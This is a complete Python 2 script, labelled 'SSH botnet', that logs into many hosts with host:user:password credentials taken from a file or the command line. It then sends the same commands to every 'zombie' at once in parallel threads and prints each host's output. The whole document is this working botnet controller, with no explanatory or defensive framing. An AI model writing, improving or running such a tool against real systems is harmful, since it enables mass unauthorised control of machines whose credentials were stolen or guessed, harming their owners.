#!/usr/bin/env python2
import argparse, pexpect.pxssh, sys, getpass, threading

### Globals ###
screenlock = threading.Semaphore(value=1)


class Zombie():
    def __init__(s, entry):
        s.entry = entry
        print("[!] Enlisting: %s" % entry)
        s.h, s.u, s.p = entry.split(':')
        s.sess = s.cx()

    def cx(s):
        try:
            sock = pexpect.pxssh.pxssh()
            sock.login(s.h, s.u, s.p)
            return sock
        except Exception, e:
            print("[!] Error connecting using %s:%s:%s" % (s.h, s.u, s.p))
            print(e)
    
    def snd_cmd(s, cmd):
        s.sess.sendline(cmd)
        s.sess.prompt()
        return(s.sess.before)

    def botOrder(s, orders):
        responses = []
        try:
            for cmd in orders[:]:
                output = s.snd_cmd(cmd)
                res = s.snd_cmd('echo $?')
                if not res.split('\r\n')[1] == "0":
                    responses.append("[!] BAD BRAINS! %s didn't like:\n\t \"\"\"%s\"\"\""  %  (s.entry, cmd))
                else:
                    responses.append(output)
        except:
            responses.append("[!] BAD BRAINS! %s didn't like:\n\t \"\"\"%s\"\"\""  %  (s.entry, cmd))
        finally:
            screenlock.acquire()
            s.banner(s.h)
            for result in responses:
                print('\n[$|#] ' + result)
            screenlock.release()
   

    def banner(s, host):
        hostr = ("    Output from %s:    " % host)
        hostr_len = len(hostr)
        pos = (50 - hostr_len)/2
        s.bann = []
        for x in range(0,3):
            s.bann.append("#"*50)
        temp = "\n\n" + s.bann[0]
        s.bann[0] = temp
        temp = ("#"*pos) + hostr + ("#"*pos)
        while not (len(temp) == 50):
            temp += "#"
        s.bann[1] = temp
        for item in s.bann:
            print(item)



class getargs():
    def __init__(s):
        s.entries = [] 
        s.CMD_LIST = []
        s.ap = argparse.ArgumentParser(description="SSH botnet.")
        s.ap.add_argument('-Ho', '--hostname', type=str, help='single hostname')
        s.ap.add_argument('-u', '--user', type=str, help="single username")
        s.ap.add_argument('-p', '--password', action='store_true', default=False, help='prompt for single password')
        s.ap.add_argument('-f', '--file', type=str, help='/etc/passwd format file with entries like host:user:password')
        s.ap.add_argument('-c', '--command', type=str, help='quoted command to send to all bots')
        s.ap.add_argument('-C', '--cmdfile', type=str, help='file containing commands to send to all bots')
        s.args, s.left = s.ap.parse_known_args() 
        if (s.args.user == None or s.args.hostname == None or s.args.password == False)\
            and (s.args.command == None and s.args.cmdfile == None):
            s.ap.print_help()
            sys.exit()
        if not (s.args.hostname == None) and not (s.args.user == None) and not (s.args.password == False):
            s.entries.append(s.args.hostname+ ':' +s.args.user+ ':' +getpass.getpass())
        if not (s.args.file == None):
            s.candidates = s.listparse(s.args.file)
            for element in s.candidates:
                s.entries.append(element)
        if not (s.args.command == None):
            s.CMD_LIST.append(s.args.command)
        if not (s.args.cmdfile == None):
            coms = s.listparse(s.args.cmdfile)
            for line in coms:
                s.CMD_LIST.append(line)


    def listparse(s,f):
        li = []
        fd = open(f, 'r')
        for item in fd:
            li.append(item.strip('\n'))
        fd.close()
        return li


def main():
    arguments = getargs()
    hoard = []
    # print(arguments.entries)
    # print(arguments.CMD_LIST)
    for candidate in arguments.entries:
        if candidate.count(":") == 2:
            hoard.append(Zombie(candidate))
    for zombie in hoard:
        threading.Thread(target=zombie.botOrder, args=(arguments.CMD_LIST, )).start()


if __name__=="__main__":
    main()




